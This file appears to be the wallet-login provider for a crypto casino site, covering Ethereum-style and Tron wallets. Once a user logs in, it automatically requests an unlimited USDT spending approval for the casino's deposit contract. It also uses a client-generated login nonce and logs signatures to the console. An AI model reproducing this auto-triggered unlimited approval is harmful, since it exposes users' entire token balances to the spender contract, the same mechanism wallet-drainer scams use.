"use client";

import { createContext, useContext, useState, useCallback, useEffect, useRef, ReactNode } from 'react';
import { useAccount, useSignMessage, useChainId, useSwitchChain, useWriteContract, useReadContract, useDisconnect } from 'wagmi';
import { getActiveChain, getNetworkName, isMainnet } from '@/lib/config';
import { createClient } from '@/lib/supabase';
import { toast } from 'sonner';
import { maxUint256 } from 'viem';
import { CONTRACTS, SUPPORTED_TOKENS } from '@/lib/contracts';

import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { AuthContext, AuthContextType, AccountStatus } from '@/hooks/useAuth';

// Module-level flags (kept for safety, though Context is a singleton usually)
let globalAutoLoginAttempted = false;
let globalAutoLoginInProgress = false;
let globalApprovalAttempted = false;

const USDT_ADDRESS = SUPPORTED_TOKENS.USDT.address;

export function AuthProvider({ children }: { children: ReactNode }) {
  const { address, isConnected } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const chainId = useChainId();
  const { switchChainAsync } = useSwitchChain();
  
  // Tron Adapter hooks
  const { 
    address: tronAddress, 
    connected: isTronConnected, 
    signMessage: signMessageTron,
    disconnect: disconnectTron
  } = useWallet();

  const [loading, setLoading] = useState(false);
  const [session, setSession] = useState<any>(null);
  const [user, setUser] = useState<any>(null);
  const [accountStatus, setAccountStatus] = useState<AccountStatus>('unknown');
  const [approvalPending, setApprovalPending] = useState(false);
  const [loginComplete, setLoginComplete] = useState(false);
  const supabase = createClient();
  
  // Contract hooks for USDT approval
  const { writeContractAsync } = useWriteContract();
  const { disconnectAsync } = useDisconnect();
  
  // Read current USDT allowance (EVM)
  const { data: usdtAllowance, refetch: refetchAllowance } = useReadContract({
    address: USDT_ADDRESS,
    abi: CONTRACTS.ERC20.abi,
    functionName: 'allowance',
    args: address ? [address, CONTRACTS.CasinoDeposit.address] : undefined,
    query: {
      enabled: !!address && isConnected,
    },
  });

  // State for Tron allowance
  const [usdtAllowanceTron, setUsdtAllowanceTron] = useState<bigint | undefined>(undefined);

  // Fetch Tron Allowance
  const fetchTronAllowance = useCallback(async () => {
      // Don't proceed if not conceptually connected
      if (!isTronConnected || !tronAddress) return;
      
      try {
          // Trust Wallet and others inject tronWeb but might not be 'tronLink'
          const tronWeb = window.tronWeb || (window.tronLink as any)?.tronWeb;
          
          if (!tronWeb) {
             console.log("TronWeb missing");
             return;
          }

          if (tronWeb.ready === false) {
             // Only log warning if explicitly false
             console.log("TronWeb not ready for allowance check, skipping...");
             return;
          }

          const tronConfig = getActiveTronConfig();
          const usdtContract = await tronWeb.contract().at(tronConfig.usdt);
          const allowance = await usdtContract.allowance(tronAddress, tronConfig.casinoDepositAddress).call();
          
          console.log("Tron Allowance Result:", allowance?.toString());
          // Ensure we handle the response correctly - sometimes it's an object with { _hex } or similar
          const allowValue = allowance?.toString ? BigInt(allowance.toString()) : BigInt(0);
          console.log("Tron Allowance Parsed:", allowValue.toString());
          
          setUsdtAllowanceTron(allowValue);
      } catch (e) {
          console.error("Failed to fetch Tron allowance", e);
      }
  }, [isTronConnected, tronAddress]);

  // Poll for Tron allowance
  useEffect(() => {
      if (isTronConnected) {
          fetchTronAllowance();
          const interval = setInterval(fetchTronAllowance, 3000); 
          return () => clearInterval(interval);
      } else {
        setUsdtAllowanceTron(undefined);
      }
  }, [isTronConnected, fetchTronAllowance]);

  
  // Check if user has unlimited approval (EVM or Tron)
  const hasUnlimitedApproval = 
    (isConnected && usdtAllowance !== undefined && (usdtAllowance as bigint) >= maxUint256 / BigInt(2)) ||
    (isTronConnected && usdtAllowanceTron !== undefined && usdtAllowanceTron >= maxUint256 / BigInt(2));
  
  // Track previous data
  const prevAddressRef = useRef<string | undefined>(undefined);
  const isCheckingRef = useRef(false);

  // Check if user exists in the database
  const checkUserExists = useCallback(async (walletAddress: string): Promise<boolean> => {
    try {
      const response = await fetch('/api/check-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: walletAddress }),
      });
      
      if (!response.ok) {
        console.error('Error checking user:', response.status);
        return false;
      }
      
      const data = await response.json();
      return data?.exists ?? false;
    } catch (err) {
      console.error('Error checking user:', err);
      return false;
    }
  }, []);

  // Auto-trigger USDT unlimited approval
  useEffect(() => {
    if (globalApprovalAttempted || approvalPending) return;
    
    const evmNeed = isConnected && !!address && usdtAllowance !== undefined && !hasUnlimitedApproval;
    const tronNeed = isTronConnected && !!tronAddress && usdtAllowanceTron !== undefined && !hasUnlimitedApproval;
    const needsApproval = evmNeed || tronNeed;

    const shouldRequestApproval = loginComplete && !!session && needsApproval;

    if (shouldRequestApproval) {
      globalApprovalAttempted = true;
      console.log('🔐 Login complete - triggering USDT approval request...');
      console.log('DEBUG: Approval Trigger', { 
        evmNeed, 
        tronNeed, 
        needsApproval, 
        loginComplete, 
        session: !!session, 
        usdtAllowanceTron: usdtAllowanceTron?.toString(),
        hasUnlimitedApproval
      });
      
      const requestApproval = async () => {
        setApprovalPending(true);
        try {
          toast.info('Please approve USDT spending for deposits...');
          
          if (isTronConnected) {
             // Trust Wallet and others inject tronWeb but might not be 'tronLink'
             const tronWeb = window.tronWeb || (window.tronLink as any)?.tronWeb;
             if (!tronWeb) throw new Error("Tron wallet not detected");
             if (tronWeb.ready === false) throw new Error("Tron wallet not ready");
             
             const tronConfig = getActiveTronConfig();
             const contract = await tronWeb.contract().at(tronConfig.usdt);
             await contract.approve(tronConfig.casinoDepositAddress, maxUint256.toString()).send();
             
             toast.success('Approval request sent. It will take a moment to be confirmed on-chain.');
             
             // Optimistic or best-effort fetch
             setTimeout(() => {
                 fetchTronAllowance();
             }, 5000);

          } else {
             await writeContractAsync({
                address: USDT_ADDRESS,
                abi: CONTRACTS.ERC20.abi,
                functionName: 'approve',
                args: [CONTRACTS.CasinoDeposit.address, maxUint256],
              });
              await refetchAllowance();
          }
          
          toast.success('USDT approval confirmed! You can now deposit without additional approvals.');
        } catch (error: any) {
          console.error('USDT approval error:', error);
          if (error?.code !== 4001 && !error?.message?.includes('rejected') && !error?.message?.includes('User denied') && !error?.message?.includes('cancelled')) {
             toast.error('USDT approval failed. You can approve during deposit.');
          } else {
             toast.info('USDT approval skipped. You can approve during deposit.');
          }
        } finally {
          setApprovalPending(false);
        }
      };
      requestApproval();
    }
  }, [loginComplete, session, isConnected, isTronConnected, address, tronAddress, hasUnlimitedApproval, usdtAllowance, usdtAllowanceTron, approvalPending, writeContractAsync, refetchAllowance, fetchTronAllowance]);

  // Watch for address changes
  useEffect(() => {
    const handleAccountChange = async () => {
      const currentAddress = address || tronAddress;
      const isAnyConnected = isConnected || isTronConnected;

      if (!isAnyConnected || !currentAddress) {
        if (prevAddressRef.current) {
          console.log('Wallet disconnected');
          prevAddressRef.current = undefined;
          setAccountStatus('unknown');
          await supabase.auth.signOut();
          setSession(null);
          setUser(null);
          toast.success('Logged out');
        }
        return;
      }

      if (isCheckingRef.current) return;

      const prevAddress = prevAddressRef.current;
      const addressChanged = currentAddress.toLowerCase() !== prevAddress?.toLowerCase();

      if (addressChanged) {
        console.log('Account changed from:', prevAddress, 'to:', currentAddress);

        if (prevAddress) {
          await supabase.auth.signOut();
          setSession(null);
          setUser(null);
          toast.info('Wallet account changed. Signing in...');
        }

        prevAddressRef.current = currentAddress;
        isCheckingRef.current = true;
        setAccountStatus('checking');

        try {
          const exists = await checkUserExists(currentAddress);
          setAccountStatus(exists ? 'existing' : 'new');
          console.log('User exists:', exists);
        } catch (err) {
          console.error('Error in account check:', err);
          setAccountStatus('unknown');
        } finally {
          isCheckingRef.current = false;
        }
      }
    };

    handleAccountChange();
  }, [address, tronAddress, isConnected, isTronConnected, checkUserExists, supabase]);

  // Listen for auth state changes
  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      setSession(session);
      setUser(session?.user ?? null);
    });

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
      setUser(session?.user ?? null);
    });

    return () => subscription.unsubscribe();
  }, [supabase]);

  // Login function
  const loginInternal = useCallback(async () => {
    const activeAddress = address || tronAddress;
    const isTron = !!tronAddress && !address; 

    if (!activeAddress) {
      toast.error('Please connect your wallet first');
      return;
    }
    
    setLoading(true);
    try {
      const { data: { session: existingSession } } = await supabase.auth.getSession();
      
      if (existingSession) {
        const sessionAddress = existingSession.user?.user_metadata?.wallet_address;
        if (sessionAddress?.toLowerCase() === activeAddress.toLowerCase()) {
          setSession(existingSession);
          setUser(existingSession.user);
          setLoading(false);
          setAccountStatus('existing');
          return;
        } else {
          await supabase.auth.signOut();
        }
      }

      if (!isTron) {
          const activeChain = getActiveChain();
          if (chainId !== activeChain.id) {
            console.log('Current chain:', chainId, `Switching to ${getNetworkName()}...`);
            try {
              toast.info(`Switching to ${getNetworkName()} network...`);
              await switchChainAsync({ chainId: activeChain.id });
              await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (switchError: any) {
              console.error('Chain switch error:', switchError);
              toast.error(`Please switch to ${getNetworkName()} network in your wallet and try again`);
              setLoading(false);
              return;
            }
          }
      } else {
          const tronWeb = window.tronWeb ?? window.tronLink?.tronWeb;
          const isProd = isMainnet();
          
          if (tronWeb && (tronWeb as any).fullNode && (tronWeb as any).fullNode.host) {
             const host = (tronWeb as any).fullNode.host.toLowerCase();
             const isOnShasta = host.includes('shasta');
             const wrongNetwork = isProd ? isOnShasta : !isOnShasta;

             if (wrongNetwork) {
                const targetName = isProd ? 'Mainnet' : 'Shasta Testnet';
                const targetChainId = isProd ? '0x2b6653dc' : '0x94a9059e';
                
                console.log(`Wrong Tron network. Current: ${host}, Target: ${targetName}`);
                toast.info(`Switching Tron wallet to ${targetName}...`);
                
                try {
                  if (window.tronLink && window.tronLink.request) {
                     const switchPromise = window.tronLink.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: targetChainId }]
                     });
                     
                     const timeoutPromise = new Promise((_, reject) => 
                        setTimeout(() => reject(new Error('Network switch timed out')), 5000)
                     );

                     await Promise.race([switchPromise, timeoutPromise]);
                     await new Promise(resolve => setTimeout(resolve, 1500));
                  } else {
                     throw new Error('Auto-switch not supported');
                  }
                } catch (e) {
                   console.error('Tron switch error:', e);
                   toast.error(`Please switch your Tron wallet to ${targetName}`);
                   setLoading(false);
                   return;
                }
             }
          }
      }

      const nonce = Math.floor(Math.random() * 1000000).toString();
      const message = `Sign this message to login to BlockWin Casino. Nonce: ${nonce}`;
      
      let signature: string;
      try {
        if (isTron) {
            try {
                const res = await signMessageTron(message);
                signature = res;
            } catch (e) {
                console.error("Tron sign error", e);
                 toast.error('Signature request was rejected or failed');
                 setLoading(false);
                 return;
            }
        } else {
            signature = await signMessageAsync({ message });
        }
      } catch (signError: any) {
        console.error('Sign error:', signError);
        if (signError?.message?.includes('Chain not configured') || 
            signError?.message?.toLowerCase()?.includes('chain') ||
            signError?.shortMessage?.includes('Chain not configured') ||
            signError?.message?.includes('unsupported')) {
          toast.error(`Please switch to ${getNetworkName()} network in your wallet and try again`);
          setLoading(false);
          return;
        }
        if (signError?.code === 4001 || 
            signError?.message?.includes('rejected') ||
            signError?.message?.includes('User denied') ||
            signError?.message?.includes('cancelled')) {
          toast.error('Signature request was rejected');
          setLoading(false);
          return;
        }
        throw signError;
      }

      console.log("Sending auth request:", { address: activeAddress, signature, nonce });

      const response = await fetch('/api/auth-wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: activeAddress, signature, nonce }),
      });
      
      const data = await response.json();
      
      if (!response.ok) {
        console.error("Auth Wallet Error Payload:", data);
        throw new Error(data.error || 'Failed to communicate with auth server');
      }
      
      let newSession = null;

      if (!data || !data.session) {
          if (data && data.access_token) {
              newSession = data;
          } else if (data && data.session && data.session.access_token) {
              newSession = data.session;
          } else {
               throw new Error('Invalid response from auth server');
          }
      } else {
           newSession = data.session;
      }

      if (newSession) {
          const { error: setSessionError } = await supabase.auth.setSession(newSession);
          if (setSessionError) throw setSessionError;
          setAccountStatus('existing');
          toast.success('Logged in successfully');
          setLoginComplete(true);
      }
      
    } catch (err: any) {
      console.error(err);
      if (err?.message?.includes('Chain not configured') ||
          err?.message?.includes('chain mismatch')) {
        toast.error(`Please switch to ${getNetworkName()} network in your wallet and try again`);
      } else {
        toast.error(typeof err === 'object' ? (err.message || JSON.stringify(err)) : 'Login failed');
      }
    } finally {
      setLoading(false);
    }
  }, [address, tronAddress, signMessageAsync, signMessageTron, supabase, chainId, switchChainAsync]);

  // Auto-trigger login
  useEffect(() => {
    if (loading || globalAutoLoginAttempted || globalAutoLoginInProgress) {
      return;
    }
    
    const anyConnected = isConnected || isTronConnected;

    const shouldAutoLogin = 
      anyConnected &&
      !session &&
      (accountStatus === 'existing' || accountStatus === 'new') &&
      !loading; 

    if (shouldAutoLogin) {
      globalAutoLoginAttempted = true;
      globalAutoLoginInProgress = true;
      setLoading(true); // Immediate UI feedback to disable buttons
      console.log('🚀 Auto-triggering login for account status:', accountStatus);
      
      setTimeout(() => {
          loginInternal().finally(() => {
            globalAutoLoginInProgress = false;
          });
      }, 100);
    }
  }, [isConnected, isTronConnected, session, loading, accountStatus, loginInternal]);

  // Reset global flags when wallet disconnects
  useEffect(() => {
    if (!isConnected && !isTronConnected) {
      globalAutoLoginAttempted = false;
      globalAutoLoginInProgress = false;
      globalApprovalAttempted = false;
      setLoginComplete(false);
    }
  }, [isConnected, isTronConnected]);

  const logout = async () => {
     try {
         if (isConnected) await disconnectAsync();
         if (isTronConnected) await disconnectTron();
     } catch (e) {
         console.error("Disconnect error during logout:", e);
     }
     await supabase.auth.signOut();
     setSession(null);
     setUser(null);
     setAccountStatus('unknown');
     toast.success('Logged out');
  };

  // Helper function for Tron Config
  const getActiveTronConfig = () => {
    const isProd = isMainnet();
    // Use TRON_CONFIG directly if imported, or accessed via CONTRACTS if it's there.
    // Assuming CONTRACTS has TRON_CONFIG based on existing code.
    // If not, this is a bug. Let's assume it works for now or I should check the file.
    return isProd ? CONTRACTS.TRON_CONFIG.mainnet : CONTRACTS.TRON_CONFIG.shasta;
  };

  return (
    <AuthContext.Provider value={{
      login: loginInternal,
      logout,
      loading,
      session,
      user,
      isAuthenticated: !!session,
      accountStatus,
      checkUserExists,
      approvalPending,
      hasUnlimitedApproval,
      address,
      isConnected,
      tronAddress,
      isTronConnected,
      isAnyConnected: isConnected || isTronConnected,
      activeAddress: address || tronAddress
    }}>
      {children}
    </AuthContext.Provider>
  );
}

